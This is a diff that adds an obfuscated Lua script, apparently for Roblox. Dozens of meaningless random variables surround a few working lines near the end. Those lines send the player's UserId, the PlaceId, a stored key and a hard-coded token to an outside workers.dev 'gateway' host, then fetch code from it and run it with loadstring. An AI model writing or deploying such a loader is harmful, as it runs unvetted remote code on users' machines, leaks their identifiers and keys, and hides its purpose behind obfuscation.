@@ -1,0 +1,54 @@
+local cjfadyqxv = "v236mi5k5y"
+local tlqlfwrlov = "hhymzvfjr8f08f"
+local nevjhjgxaph = "y7f930vs7ifu"
+local ekwlpfnr = "cdh2cag5bqv0iwz9y"
+local wqgqxpymddhqwt = "vkzj9dlq436m1bvp"
+local cyhvczdepjah = "apajf0mh3wzr"
+local tuwudtjstplkw = "pasm0y1q4mu0"
+local rkyvkyny = "zkqoujy0up5gl1gs5"
+local dkwjowfvpfvnw = "41mglyy2a1no8v5q"
+local kuqltsoqnqf = "l25hxq3hn0"
+local lnarvhomwyuh = "k9wgjmacxmhtvsskk"
+local hkizsmfjzz = "ckybr30vrs64"
+local fgrojhtex = "7r9gpnvaag2bos7"
+if _G["6777"] ~= true then return end
+local zdiwczovj = "wy18pkduzb"
+local pxwcpjmwp = "bbhmtjr411lb2k7"
+local kvfuxrrxdvayki = "4e3pudc5adargvc"
+local kdutkmobuzftxd = "bmj10rjb1z3"
+local fukqdrxdnombc = "xncpewkivvv2n4"
+local ynrdtgeishtf = "4ixxfd81nzd47ao4"
+local pjtkecqnzr = "qjijkej10h"
+local xzwwinohjdy = "xt9vfct5djg9q1i"
+local hkloasjlytntyz = "l9mps7bm5mih7"
+local iymfxhtpnrvsff = "p5xq87n2z1m35opj"
+local uhaszdas = "c9ntbf8fpdwq1e"
+local gqfrwywnavza = "erpna6u8uy1rottes"
+local yvxszamqpa = "ylce3g32y6h"
+_G["jsmxsphrnklp"] = "gddxcw9k1v35hhwck6"
+_G["__ls_reached_redirect"] = true
+local geerligqerb = "vqsezsqzx5ji"
+local ejxlhhztqqgfn = "ukfbzoqas0a0p"
+local ologskmkdtym = "ek7tc5ais5hh6eb"
+local uezwhehzu = "qmfb1o1usjwsexx"
+local dvqvwmpqgalwt = "xovbw6x6lf4d"
+local jrhangpwnsmfbw = "xadlnm32zpdev"
+local enfoiywoyhymni = "dq7cbcgtnlm8c"
+local idgcoqzgeliakx = "z1xpoiezaw73"
+local decdzeaitvddh = "y840355jmc10ukqlp1"
+local dknvsxpji = "mwyeqpecm2n1jdw0"
+local huugncev = "lv3zskr84c9u7qu"
+local tpcbwlhwwko = "4j0eiq0whg"
+local rqetfcfpu = "ljurauyxz7urp0un"
+local xljqjchgayb = "cip45lrcd7jcy5totqj3d"
+local dsaduuaassgas = tostring(_G["Key"] or "")
+_G["hllmmqvnkmfr"] = auth
+local yhmnhkpbgnc = tostring(game:GetService("Players").LocalPlayer.UserId)
+local mrdqdjjlmdlqy = tostring(game.PlaceId)
+local bdyiwdfqgpod = "https://lazybear-gateway.iusemaybehook.workers.dev/?file=lazybear0340_123.lua&token=WfDj5KdPUH6uLJD9Y5xGDXOh5vSp62EQPXhzSsAqvqk&ck=" .. xljqjchgayb .. "&sv=gddxcw9k1v35hhwck6&uid=" .. yhmnhkpbgnc .. "&pid=" .. mrdqdjjlmdlqy .. "&key=" .. dsaduuaassgas .. "&hwid=" .. yhmnhkpbgnc
+local fzqmjzxqulovt = game:HttpGet(bdyiwdfqgpod, true)
+if not fzqmjzxqulovt or fzqmjzxqulovt == "" then return end
+local _fn, _err = loadstring(fzqmjzxqulovt)
+if not _fn then return end
+_fn()
+_G["hllmmqvnkmfr"] = nil
